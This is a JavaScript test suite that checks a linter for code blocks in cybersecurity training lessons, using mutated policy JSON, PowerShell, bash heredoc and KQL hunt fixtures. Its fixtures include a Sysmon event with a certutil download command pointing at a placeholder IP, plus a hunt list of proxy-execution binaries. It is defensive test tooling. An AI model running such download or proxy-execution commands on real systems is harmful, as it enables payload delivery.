// Controls for audit-lesson-code.mjs.
//
// WHY A CONTROL SUITE
//
// A guard that has never failed is a comment. Every rule below was proved able
// to FAIL on the defect it claims to catch, and to PASS on the real corpus and
// on correct text.
//
// The T0.2 rules are checked against the shape of a defect this repository has
// already found by hand — an AWS CLI payload with the wrong nesting — rather
// than against an invented one. That payload was valid JSON and an invalid
// policy, which is why `JSON.parse` alone is not the guard: "it parses" and "it
// works" are different claims and only the first is free.
//
// TWO OF THESE CONTROLS GUARD THE GUARD AGAINST ITS OWN FALSE POSITIVES, and
// they are the two that a suite written only from the defect side would miss:
//
//   - `//` inside a JSON string value. `07-phase-detection-as-code.md` really
//     does contain `http://198.51.100.44/a.dat` inside a CommandLine string.
//     Stripping `//` comments before parsing — the reflex after reading YAML —
//     would corrupt that line and report a valid block as broken. The control
//     plants a URL and requires the guard to stay silent.
//   - A malformed JSON body inside a ```text fence. The guard takes the
//     language from the info string and never from the shape of the body,
//     because `09-phase-cloud-and-identity.md` has an indented ```text block of
//     AWS credentials that is shaped exactly like a policy. Matching on shape
//     would pull teaching evidence in as a payload.
//
// Every fixture is applied to a COPY, and the working tree is verified
// byte-identical afterwards. A control suite that mutates the corpus and leaves
// it changed is worse than no control suite.
//
// Each control asserts a NAMED BRANCH -- that the guard's own words appear --
// and not merely a non-zero exit. D-049 recorded two rules that were dead code
// while the guard still exited non-zero for an unrelated per-phase reason, and a
// control that checks only the exit code would have recorded PASS both times.

import fs from "node:fs";
import path from "node:path";
import { execFileSync } from "node:child_process";

const ROOT = path.resolve(import.meta.dirname, "..");
const GUARD = path.join(ROOT, "scripts", "audit-lesson-code.mjs");
const BT = String.fromCharCode(96);

/**
 * Every Markdown file under `career-roadmaps/`, and how many fence OPENERS it holds.
 *
 * An INDEPENDENT count, which is the property that matters. The guard's own
 * denominator was reconciled once, in D-075, against a second extractor precisely
 * because "a total asserted by the only implementation that computed it proves
 * nothing" -- so this counts independently rather than asking the guard what it
 * thinks it read.
 */
function walkMarkdownFiles() {
  const root = path.join(ROOT, "career-roadmaps");
  const files = [];
  const walk = (dir) => {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, e.name);
      if (e.isDirectory()) walk(p);
      else if (e.name.endsWith(".md")) files.push(p);
    }
  };
  walk(root);
  return { files, paths: files };
}

/**
 * Count fenced BLOCKS independently, by toggling on each fence line.
 *
 * Counting fence LINES gives 1300 where the guard reports 650 blocks, and the
 * first version of this helper did exactly that -- so the control failed on a
 * correct corpus for the difference between a line and a block. Each block is an
 * opener and a closer, and the state has to be tracked across the FILE rather than
 * the block, since a block can legitimately span lines that look like fences.
 */
function countFenceOpeners(onDisk) {
  let n = 0;
  for (const f of onDisk.paths) {
    let inFence = false;
    for (const line of fs.readFileSync(f, "utf8").split("\n")) {
      if (!line.trimStart().startsWith(BT + BT + BT)) continue;
      if (!inFence) {
        n++;
        inFence = true;
      } else {
        inFence = false;
      }
    }
  }
  return n;
}

let pass = 0;
let failed = 0;

function run() {
  try {
    const out = execFileSync(process.execPath, [GUARD], { cwd: ROOT, encoding: "utf8" });
    return { code: 0, out };
  } catch (e) {
    return { code: e.status ?? 1, out: (e.stdout ?? "") + (e.stderr ?? "") };
  }
}

function check(name, cond, detail = "") {
  if (cond) {
    console.log(`  pass  ${name}`);
    pass++;
  } else {
    console.log(`  FAIL  ${name}${detail ? "\n        " + detail : ""}`);
    failed++;
  }
}

const POLICY = "career-roadmaps/advance-roadmap/04-phase-cloud-identity-architecture.md";
const EVENTS = "career-roadmaps/advance-roadmap/07-phase-detection-as-code.md";
// Two more targets exist only for T0.4, because both of the traps that tier has
// to survive live in files the shape-tier fixtures do not touch.
const DETECT = "career-roadmaps/advance-roadmap/01-phase-detection-at-scale.md";
const IT03 = "career-roadmaps/it-roadmap/03-phase-networking-basics.md";
const SCRIPT12 = "career-roadmaps/cybersec-roadmap/12-phase-scripting-automation.md";
// The target for T0.3's two-stage hunt. It is a real file rather than a fixture
// because the defect being guarded is a relationship BETWEEN two blocks in the
// corpus, and a synthetic single block could not express it.
const HUNT = "career-roadmaps/advance-roadmap/02-phase-threat-hunting.md";
// Holds the corpus's only bash heredoc, which is the DATA-region fixture. See
// the FN-3 control below: an unclosed delimiter in prose inside a heredoc must
// not be counted, and that is only testable where a heredoc actually exists.
const INCIDENT = "career-roadmaps/advance-roadmap/03-phase-incident-command.md";

const TARGETS = [POLICY, EVENTS, DETECT, IT03, SCRIPT12, HUNT, INCIDENT].map((t) => {
  const p = path.join(ROOT, t);
  return { t, p, text: fs.readFileSync(p, "utf8") };
});

function restore() {
  for (const b of TARGETS) fs.writeFileSync(b.p, b.text, "utf8");
}

// `expect` is null for a control that must pass, or a substring the guard's
// output must contain -- the named branch, so a control cannot be satisfied by
// an unrelated failure.
function withFixture(name, file, find, replace, expect) {
  const target = TARGETS.find((b) => b.t === file);
  if (!target) throw new Error(`control names a file that is not a target: ${file}`);

  const original = target.text;
  if (!original.includes(find)) {
    check(
      name,
      false,
      "FIXTURE MATCHED NOTHING — the guard's control tests a string the corpus no longer contains. A control that cannot be applied proves nothing.",
    );
    return;
  }
  if (original.split(find).length - 1 !== 1) {
    check(
      name,
      false,
      `FIXTURE MATCHED ${original.split(find).length - 1} TIMES — it must be unique, or the control mutates a different block than the one it names.`,
    );
    return;
  }

  // `finally`, for the reason in the header of `test-audit-sigma.mjs`.
  //
  // This line was NOT in a `finally`, and on 2026-10-02 that left a mutated SCP
  // policy block in `advance-roadmap/04-phase-cloud-identity-architecture.md`:
  // `"Version": "2012-10-17"` had become `"2012-10-17T00:00:00Z"` and an
  // `Action` had become a `Resource`. The next run of `audit-lesson-code.mjs`
  // then reported the file as a genuine T0.2 finding -- **a defect the test suite
  // had written, reported as a defect in the content.** D-079 records that hazard
  // and records two suites fixed for it; this was a third, in the same file where
  // the fix had already been applied to a *different* helper. Every write/restore
  // pair in this file is now paired.
  let r;
  try {
    fs.writeFileSync(target.p, original.replace(find, replace), "utf8");
    r = run();
  } finally {
    restore();
  }

  const named = expect === null || r.out.includes(expect);
  check(
    name,
    expect === null ? r.code === 0 : r.code !== 0 && named,
    `exit=${r.code} guardNamedTheDefect=${named}${r.code !== 0 ? "" : "\n" + r.out.slice(-500)}`,
  );
}

// For a construct the CORPUS DOES NOT CONTAIN. Several of the defects this
// suite now guards were latent precisely because the corpus has no here-string,
// no `case`, and no `cat <<EOF > out` — so a control that mutates an existing
// block cannot reach them. This appends a whole fenced block, runs the guard,
// and restores the file byte-for-byte.
//
// `mode` is "pass" (correct code, guard must be silent) or "fail" (broken code,
// guard must name it) or "declined" (correct code the tier cannot analyse, so
// the guard must SAY it skipped rather than pass over it in silence).
function withAddedBlock(name, file, block, expect, mode) {
  const target = TARGETS.find((b) => b.t === file);
  if (!target) throw new Error(`control names a file that is not a target: ${file}`);

  // The restore is in `finally`, for the reason recorded in `test-audit-sigma.mjs`
  // and `test-audit-framework-claims.mjs`: on 2026-10-02 one of those suites was
  // found to have left a probe appended to a real phase file after an abnormal
  // exit, and the guard then reported a content defect the suite had itself
  // written. `docs/DECISIONS.md` records this hazard as D-058.
  let r;
  try {
    fs.writeFileSync(target.p, `${target.text}\n${block}\n`, "utf8");
    r = run();
  } finally {
    restore();
  }

  const named = r.out.includes(expect);
  const ok =
    mode === "pass" ? named === false && r.code === 0
    : mode === "declined" ? named && r.code === 0
    : named && r.code !== 0;
  check(
    name,
    ok,
    `exit=${r.code} expectedBranchPresent=${named}\n${r.out.slice(-600)}`,
  );
}

// --- 0. the real corpus, untouched ------------------------------------------

{
  const r = run();
  check("the corpus as shipped -> must PASS", r.code === 0, r.code !== 0 ? r.out.slice(0, 900) : "");
}

// The corpus is expected to hold 22 ```json blocks and 14 of them in a policy
// grammar. A control that only ever mutates cannot notice that the instrument's
// own denominator has silently shrunk — which is this repository's most
// frequently repeated failure, in five separate forms.
{
  const r = run();
  const blocks = /fenced blocks found\s*:\s*(\d+)/.exec(r.out);
  const jsonTier = /T0\.1 json parses\s+(\d+) of (\d+) checked/.exec(r.out);
  const shapeTier = /T0\.2 json document shape\s+(\d+) of (\d+) checked/.exec(r.out);
  check(
    "the guard counts 22 ```json blocks and checks all of them",
    blocks !== null && jsonTier !== null && Number(jsonTier[1]) === 22 && Number(jsonTier[2]) === 22,
    `blocks=${blocks?.[1]} json=${jsonTier?.[1]}/${jsonTier?.[2]}`,
  );
  check(
    "the shape tier's skipped blocks are reported, not hidden",
    shapeTier !== null && /not checked:/.test(r.out),
    `shape=${shapeTier?.[1]}/${shapeTier?.[2]}`,
  );
}

// The TOTAL, not just the JSON subset — and this control exists because the
// guard lost a block without anyone noticing.
//
// It read `career-roadmaps/NN-*.md` only, which is 34 of the corpus's 62
// Markdown files, and reported 649 blocks where the corpus holds 650. The lost
// block was `career-roadmaps/README.md:17`. No check went red, because every
// check was correct about a corpus that was quietly too small.
//
// 650 was not taken on trust. It was reconciled against a second extractor
// written independently of the guard's own: a loose grep-style scan of every
// language-tagged fence line gave 650, a state-tracking CommonMark pass gave
// 650 openers with 0 unterminated fences and 0 lines that were neither an
// opener nor a closer, and the guard now agrees with both. A total asserted
// from one implementation would only ever prove that implementation is
// self-consistent.
{
  const r = run();
  const total = /fenced blocks found\s*:\s*(\d+)/.exec(r.out);
  const files = /markdown files read\s*:\s*(\d+)/.exec(r.out);

  // DERIVED FROM THE FILESYSTEM, not hardcoded.
  //
  // This control asserted 62 files and 650 blocks, and it failed on 2026-10-02 for
  // the right reason: `career-roadmaps/shared/GLOSSARY.md` was added, so the
  // corpus is 63 files. **A hardcoded denominator is a figure that goes stale the
  // next time content is written**, and the fix is not to bump the number -- it is
  // to assert the RELATIONSHIP the check exists for: the guard must read every
  // Markdown file under `career-roadmaps/`. A guard that narrowed its file list
  // would still read *some* files, and only a count derived from what is on disk
  // can tell the difference.
  const onDisk = walkMarkdownFiles();
  const blocksOnDisk = countFenceOpeners(onDisk);
  const diskFileCount = onDisk.paths.length;

  check(
    "the guard reads EVERY markdown file under career-roadmaps/ (denominator derived, not hardcoded)",
    total !== null &&
      files !== null &&
      Number(files[1]) === diskFileCount &&
      Number(total[1]) === blocksOnDisk,
    `guard: files=${files?.[1]} blocks=${total?.[1]} | on disk: files=${diskFileCount} blocks=${blocksOnDisk}`,
  );
}

// --- 1. T0.2, the nesting defects -------------------------------------------
//
// Each of these is valid JSON. None of them can be caught by JSON.parse, which
// is the entire reason this tier exists.

withFixture(
  "a statement carrying BOTH Action and NotAction -> must FAIL naming the branch",
  POLICY,
  `      "Sid": "DenyRootUserExceptForTheTasksThatRequireIt",
      "Effect": "Deny",
      "NotAction": [`,
  `      "Sid": "DenyRootUserExceptForTheTasksThatRequireIt",
      "Effect": "Deny",
      "Action": ["s3:GetObject"],
      "NotAction": [`,
  "carries both `Action` and `NotAction`",
);

withFixture(
  "a statement with NO Effect -> must FAIL naming the branch",
  POLICY,
  `      "Sid": "DenyLeavingTheOrganization",
      "Effect": "Deny",
      "Action": [`,
  `      "Sid": "DenyLeavingTheOrganization",
      "Action": [`,
  "has no `Effect`",
);

withFixture(
  "a statement with neither Action nor NotAction -> must FAIL naming the branch",
  POLICY,
  `      "Sid": "ProtectTheAuditTrail",
      "Effect": "Deny",
      "Action": [`,
  `      "Sid": "ProtectTheAuditTrail",
      "Effect": "Deny",
      "Resource": [`,
  "neither `Action` nor `NotAction`",
);

// The member is replaced by a bare string, which keeps the document valid JSON —
// so this is a shape defect only `JSON.parse` cannot see, and it is the reason
// the shape tier exists at all. A `Sid` that is itself an array is NOT tested:
// the grammar does not constrain `Sid`, and inventing a rule nobody specified is
// how a guard starts flagging valid usage.
withFixture(
  "a member of Statement that is not an object -> must FAIL naming the branch",
  POLICY,
  `  "Statement": [
    {
      "Sid": "DenyLeavingTheOrganization",`,
  `  "Statement": [
    "not-an-object",
    {
      "Sid": "DenyLeavingTheOrganization",`,
  "not a statement object",
);

withFixture(
  "a Version that is not the ISO date the grammar defines -> must FAIL naming the branch",
  POLICY,
  `"Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyLeavingTheOrganization",`,
  `"Version": "2012-10-17T00:00:00Z",
  "Statement": [
    {
      "Sid": "DenyLeavingTheOrganization",`,
  "not the ISO date",
);

// --- 2. T0.1, a block that is not JSON at all --------------------------------

withFixture(
  "a ```json block with a dropped comma -> must FAIL naming the branch",
  POLICY,
  `      "Sid": "ProtectTheAuditTrail",`,
  `      "Sid": "ProtectTheAuditTrail"`,
  "is not valid JSON",
);

// --- 3. the two false-positive controls --------------------------------------
//
// A guard that flags valid usage gets switched off, and these are the two ways
// this one would have done it on the corpus as it already stands.

withFixture(
  "`//` inside a JSON string value -> must still PASS (no comment stripping)",
  EVENTS,
  `"CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.44/a.dat C:\\\\Users\\\\Public\\\\a.dat",`,
  `"CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.44/a.dat?x=1&y=// C:\\\\Users\\\\Public\\\\a.dat",`,
  null,
);

// Anchored on the block's own User value, which is unique in the file. Two
// earlier attempts anchored on `Computer`/`EventID` and matched 3 and 2 blocks
// respectively — the suite caught both, which is why a control asserts its own
// fixture is unique rather than trusting the author to have picked a good one.
// Anchored on this block's own CommandLine, which no sibling fixture repeats.
// Three earlier anchors were tried and each matched more than one block — two of
// the three fixtures in this file share both a Computer name and a User. The
// suite caught every attempt, which is the reason a control asserts its own
// fixture is unique instead of trusting the author to have picked a good one.
withFixture(
  "a broken JSON body inside a ```text fence -> must still PASS (language is never inferred)",
  EVENTS,
  '```json\n{\n  "EventID": 1,\n  "Channel": "Microsoft-Windows-Sysmon/Operational",\n  "Computer": "WS-0142",\n  "User": "CORP\\\\a.reyes",\n  "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n  "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.44/a.dat C:\\\\Users\\\\Public\\\\a.dat",',
  '```text\n{\n  "EventID": 1,\n  "Channel": "Microsoft-Windows-Sysmon/Operational",\n  "Computer": "WS-0142",\n  "User": "CORP\\\\a.reyes",\n  "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n  "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.44/a.dat C:\\\\Users\\\\Public\\\\a.dat",',
  null,
);

// The Azure Policy block is a different grammar with its own rules. This control
// plants exactly the shape the naive rule would flag, inside the one class the
// guard must exclude — so it fails if the classifier stops working, and equally
// if the rule is quietly deleted.
withFixture(
  "an Azure Policy block carrying Action and NotAction -> must still PASS (different grammar)",
  POLICY,
  `  "then": {
    "effect": "deny"
  }`,
  `  "then": {
    "effect": "deny",
    "Action": [],
    "NotAction": []
  }`,
  null,
);

// --- 4. T0.4, the shell-dialect counter --------------------------------------
//
// This tier reports 277 of 277 blocks balanced, and a check that finds nothing
// is worthless unless it can be shown to find something. These six controls are
// split deliberately: two pin the two false-positive traps the corpus contains
// by construction, three prove it still reports real breakage, and one is
// INVERTED — it must FAIL, and it only fails if the counter is right about a
// rule that is easy to get backwards.

// Trap 1, and the reason the tier exists in this form. The first version of the
// counter stripped nothing and recognised nothing, and produced TEN false
// findings, every one of them an ordinary English apostrophe inside a comment:
// `# On Maria's PC`, `# the policy's *default* version`, `# your rule's noise
// profile`. One extra apostrophe here must not change the verdict.
withFixture(
  "an apostrophe inside a PowerShell `#` comment -> must still PASS",
  IT03,
  `# On Maria's PC
ipconfig /all`,
  `# On Maria's PC — it's the one with the printer, and Maria's account is local
ipconfig /all`,
  null,
);

// Trap 2, the opposite direction, and the reason comments cannot simply be
// stripped before counting. `$node.'#text'` is XML text inside a single-quoted
// string. A counter that treated `#` as a comment would truncate that line at
// the `#` and be left holding one unpaired quote. Two `#` inside one string
// must not change the verdict either.
withFixture(
  "a `#` inside a single-quoted PowerShell string -> must still PASS (not a comment)",
  DETECT,
  `        $field[$node.Name] = $node.'#text'`,
  `        $field[$node.Name] = $node.'#text#and-more'`,
  null,
);

// Now the three that must report. Each asserts the guard's own words, per D-049.
withFixture(
  "a PowerShell block left with an unclosed `{` -> must FAIL naming the branch",
  IT03,
  `# On Maria's PC
ipconfig /all`,
  `# On Maria's PC
ipconfig /all | ForEach-Object { $_.Name`,
  "is never closed",
);

withFixture(
  "a PowerShell block left with an unclosed single quote -> must FAIL naming the branch",
  IT03,
  `# On Maria's PC
ipconfig | Select-String "IPv4", "Subnet"`,
  `# On Maria's PC
ipconfig | Select-String "IPv4", "Subnet"; Write-Output 'oops`,
  "a single quote is never closed",
);

// PowerShell's `<# ... #>` block comment is a real construct in the corpus
// (`cyber-12:861`). Remove the terminator and it must be reported as its own
// branch, not swallowed as a stray quote.
withFixture(
  "a PowerShell `<#` block comment with no `#>` -> must FAIL naming the branch",
  SCRIPT12,
  `    .\\Invoke-Triage.ps1 -OutputRoot D:\\evidence
#>`,
  `    .\\Invoke-Triage.ps1 -OutputRoot D:\\evidence`,
  "block comment is never closed",
);

// INVERTED. In bash a `#` only opens a comment at the start of a word, so in
// `echo a#b"c"` the `#` is literal text and the `"` genuinely opens a string
// that is never closed. A counter that treated every `#` as a comment would skip
// the rest of the line and PASS this — so the control failing is the evidence
// that the word-start rule is actually implemented rather than assumed.
withFixture(
  "a bash `#` glued to the previous word is NOT a comment -> must FAIL naming the branch",
  DETECT,
  `# Open the review, even if the reviewer is you.
git push -u origin det/add-encoded-powershell-rule`,
  `# Open the review, even if the reviewer is you.
git push -u origin det/add-encoded-powershell-rule
echo a#b"c`,
  "a double quote is never closed",
);

// For a tier that REPORTS rather than gates. The exit code is 0 whether or not
// the tier found something, so `withFixture` above cannot express these at all —
// it asserts `r.code !== 0`, and a control that only ever checked the exit code
// would pass here on every run and prove nothing.
//
// So these assert the guard's own WORDS. `present` requires the named branch in
// the output; `absent` requires it to be missing. Both also require exit 0,
// which is the point being pinned: a reported finding must not change the exit
// code, because a report that fails the build is a gate with worse manners.
function withReport(name, file, find, replace, expect, mode) {
  const target = TARGETS.find((b) => b.t === file);
  if (!target) throw new Error(`control names a file that is not a target: ${file}`);

  const original = target.text;
  const hits = original.split(find).length - 1;
  if (hits === 0) {
    check(
      name,
      false,
      "FIXTURE MATCHED NOTHING — the guard's control tests a string the corpus no longer contains. A control that cannot be applied proves nothing.",
    );
    return;
  }
  if (hits !== 1) {
    check(
      name,
      false,
      `FIXTURE MATCHED ${hits} TIMES — it must be unique, or the control mutates a different block than the one it names.`,
    );
    return;
  }

  // `finally` — see the note on the other fixture helper above. This is the third
  // unguarded write/restore pair that has been found in this one file.
  let r;
  try {
    fs.writeFileSync(target.p, original.replace(find, replace), "utf8");
    r = run();
  } finally {
    restore();
  }

  const named = r.out.includes(expect);
  const ok = mode === "present" ? named && r.code === 0 : !named && r.code === 0;
  check(
    name,
    ok,
    `exit=${r.code} namedBranch${mode === "present" ? "missing" : "present"}=${!named}\n${r.out.slice(-400)}`,
  );
}

// --- 5. T0.3, and specifically WHICH DIRECTION it reports --------------------
//
// T0.3 reports instead of gating, so a control asserting only the exit code
// would pass on every run. These two are the pair that makes the tier's rule
// mean something, and the second is the one that matters.
//
// The rule is one-directional on purpose. A later hunt stage that is WIDER than
// the one before it loses nothing — it catches everything the earlier stage
// caught — so reporting it is noise. Only a later stage that is a strict SUBSET
// can drop an event between two stages, and only that is printed.
//
// An earlier version of this check reported ANY difference and produced four
// findings for one real defect. A report that repeats itself on every run is one
// people learn to scroll past, and the next genuine finding goes unread with it.
// The two controls below are what stop that regression: one plants the case that
// MUST be reported, and one plants the case that must NOT.

const STAGE2_HEAD =
  `// HUNT-2026-021, stage 2 — did any of those proxy executions talk out?\n` +
  `let lookback = 30d;\n` +
  `let proxies = dynamic(["rundll32.exe", "regsvr32.exe", "mshta.exe", "installutil.exe"]);`;

withReport(
  "a later stage that drops a binary the first stage matched -> must REPORT, and must not fail the build",
  HUNT,
  STAGE2_HEAD,
  STAGE2_HEAD.replace(
    `"rundll32.exe", "regsvr32.exe", "mshta.exe", "installutil.exe"`,
    `"rundll32.exe", "regsvr32.exe", "mshta.exe"`,
  ),
  "is narrowed by a later stage",
  "present",
);

// The inverse, and the control that makes the tier a rule rather than a report.
// `msbuild.exe` is in the second stage and not the first, so the second stage is
// WIDER: every event the first stage returns still reaches it. Nothing is lost,
// so the guard must say nothing — and it must still exit 0, because a widened
// stage is correct content and must never look like a defect.
withReport(
  "a later stage that is WIDER than the first -> must NOT report (only the narrowing direction loses events)",
  HUNT,
  STAGE2_HEAD,
  STAGE2_HEAD.replace(
    `"mshta.exe", "installutil.exe"`,
    `"mshta.exe", "installutil.exe", "msbuild.exe"`,
  ),
  "is narrowed by a later stage",
  "absent",
);

// And the same rule in the other element. The path list is compared independently
// of the binary list, because a stage can drop a path root while keeping every
// binary — which is a silent narrowing just as much.
withReport(
  "a later stage that drops a path root but keeps every binary -> must REPORT",
  HUNT,
  `    | where ProcessCommandLine has_any (@"\\AppData\\", @"\\Temp\\", @"\\Downloads\\", @"\\ProgramData\\", @"\\Users\\Public\\")\n    | project DeviceId, DeviceName, ProcessId = tostring(ProcessId), Timestamp;`,
  `    | where ProcessCommandLine has_any (@"\\AppData\\", @"\\Temp\\", @"\\Downloads\\", @"\\ProgramData\\")\n    | project DeviceId, DeviceName, ProcessId = tostring(ProcessId), Timestamp;`,
  "path roots the first matches and the second does not",
  "present",
);

// --- 6. T0.4's false NEGATIVES, found by an independent verification pass -----
//
// The two controls above are the tier's happy path and its two false-positive
// traps. These are the opposite, and they exist because a second implementation
// written from the specification found a false negative that the original did
// not have a control for — a dropped `)` inside `$( )` that the guard could not
// see, in a construct that occurs SIX TIMES in the corpus today.
//
// A guard that finds nothing is only worth what its controls are worth, and a
// false negative is invisible: it looks exactly like a clean block. So each of
// these plants the broken form in a place the corpus already contains the
// correct form, and requires the guard to name it.

// FN-1. `"$($x.Count"` — PowerShell's own parser rejects this ("the subexpression
// is missing the closing ')'"), and the previous version of this guard skipped
// every character after the opening `"`, so it was blind to it. The corpus has
// six `$( )` subexpressions and all six balanced, which is luck, not a rule.
withFixture(
  "a dropped `)` inside a `$( )` subexpression in a double-quoted string -> must FAIL naming the branch",
  DETECT,
  `"Total candidate alerts: $($matches.Count)"`,
  `"Total candidate alerts: $($matches.Count"`,
  "subexpression inside a double-quoted string is never closed",
);

// The same line in its correct form must stay silent, or the control above would
// pass for the wrong reason — a guard that flags the balanced form too is not
// detecting the defect, it is flagging the line.
withFixture(
  "a balanced `$( )` subexpression -> must still PASS (it is the same line, correct)",
  DETECT,
  `"Total candidate alerts: $($matches.Count)"`,
  `"Total candidate alerts: $($matches.Count)"  `,
  null,
);

// FN-3, a different failure with the same shape. An unterminated DATA region:
// PowerShell's `@"` here-string and bash's `<<WORD` heredoc both hold text that
// is never tokenised, so the `{` in a line of prose inside one must not be
// counted as an unbalanced brace. The corpus's single heredoc is a Markdown
// decision log at `advance-03:681`, and it happens to contain no brace today.
withFixture(
  "an unbalanced `{` in PROSE inside a bash heredoc body -> must still PASS (a DATA region is text, not code)",
  INCIDENT,
  `## D-012 — 2026-04-17 08:20Z`,
  `## D-012 — 2026-04-17 08:20Z — payload: { unbalanced`,
  null,
);

// The inverse: a DATA region that is never closed at all IS a real defect, and
// the block that follows it is then unanalysable, so it must be reported rather
// than passed over. Remove the terminator line.
withFixture(
  "a bash heredoc with no closing `EOF` line -> must FAIL naming the branch",
  INCIDENT,
  `EOF\n`,
  ``,
  "DATA region is never closed",
);

// --- 7. the five defects an independent re-implementation found ---------------
//
// Every control so far tests a construct the corpus HAPPENS to contain. These
// test five that it does not, which is why they were all latent: a here-string,
// a `case`, and a heredoc with trailing redirection are all absent today, and
// absent means untested. The first three were FALSE POSITIVES — correct code
// turned red — which is the failure that gets a guard switched off, and the
// fourth was a documented feature that was in fact DEAD CODE.
//
// The general form: **a guard's coverage is exactly as good as the constructs
// someone thought to test, and "the corpus has none" is not a safety claim.**

// D1. A here-string body is DATA. The `'` in `Don't` is text, and a version
// that tokenised the body called it a string delimiter and then reported the
// real closing `'@` as an unclosed quote — correct PowerShell, red build.
withAddedBlock(
  "a PowerShell here-string whose body contains an apostrophe -> must still PASS",
  SCRIPT12,
  "```powershell\n$n = @'\nDon't panic — the policy is read-only.\n'@\n```",
  "does not balance",
  "pass",
);

// D2. The same defect read from the other side: the body is DATA, so an
// unbalanced bracket in it is not an unbalanced bracket in the block.
withAddedBlock(
  "an unbalanced brace inside a here-string body -> must still PASS (DATA, not code)",
  SCRIPT12,
  "```powershell\n$p = @\"\npayload: { unbalanced ( in prose\n\"@\n```",
  "does not balance",
  "pass",
);

// D3. A heredoc whose delimiter is NOT at the end of the line. `cat <<EOF > out`
// and `cat <<EOF | grep x` are ordinary bash; requiring end-of-line made both
// look like an unterminated body.
withAddedBlock(
  "a heredoc with trailing redirection `<<EOF > out` -> must still PASS",
  INCIDENT,
  "```bash\ncat <<EOF > out\nlog line with { a brace\nEOF\n```",
  "does not balance",
  "pass",
);

withAddedBlock(
  "a heredoc piped into another command `<<EOF | grep x` -> must still PASS",
  INCIDENT,
  "```bash\ncat <<EOF | grep x\nlog line with ( a paren\nEOF\n```",
  "does not balance",
  "pass",
);

// D4. A comment that merely MENTIONS the construct must not open one. A `#`
// ends the line before the opener is reached, which is why detection happens
// inside the character loop and not by testing the line up front.
withAddedBlock(
  "a PowerShell comment that mentions `@\"` -> must still PASS (a comment cannot open a DATA region)",
  SCRIPT12,
  "```powershell\n# The payload is written with @\"\nWrite-Output \"ok\"\n```",
  "does not balance",
  "pass",
);

withAddedBlock(
  "a bash comment that mentions `<<EOF` -> must still PASS (same reason)",
  INCIDENT,
  "```bash\n# see the <<EOF example in the manual\ngrep x file\n```",
  "does not balance",
  "pass",
);

// D5. `case`/`esac` and `$'...'`. Both are false positives for this tier: a
// `case` pattern's `)` is not a bracket closer, and `$'a\'b'` closes on the
// escaped quote. Rather than half-implement a bash grammar — which is how the
// ten apostrophe findings happened in the first place — the tier DECLINES such
// a block and says so, so `278 of 278` is never read as `278 analysable`.
withAddedBlock(
  "a bash `case` block -> must be DECLINED as unchecked, not silently analysed",
  INCIDENT,
  "```bash\ncase $x in\n  a) echo 1 ;;\nesac\n```",
  "DECLINED and counted as skipped",
  "declined",
);

withAddedBlock(
  "bash `$'...'` ANSI-C quoting -> must be DECLINED as unchecked",
  INCIDENT,
  "```bash\nx=$'it\\'s fine'\n```",
  "DECLINED and counted as skipped",
  "declined",
);

// The opposite of D5, so DECLINING cannot quietly become "skip everything":
// a here-string containing the same text is analysed, not declined.
withAddedBlock(
  "a here-string containing `case` and `!` -> must still PASS (declining is not a blanket skip)",
  SCRIPT12,
  "```powershell\n$t = @'\ncase $x in\n  a) echo ! ;;\nesac\n'@\n```",
  "does not balance",
  "pass",
);

// --- 8. the working tree is exactly as it was found ---------------------------

{
  const intact = TARGETS.every((b) => fs.readFileSync(b.p, "utf8") === b.text);
  check("every touched file restored byte-identical", intact);
}

console.log("");
console.log(`${pass} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
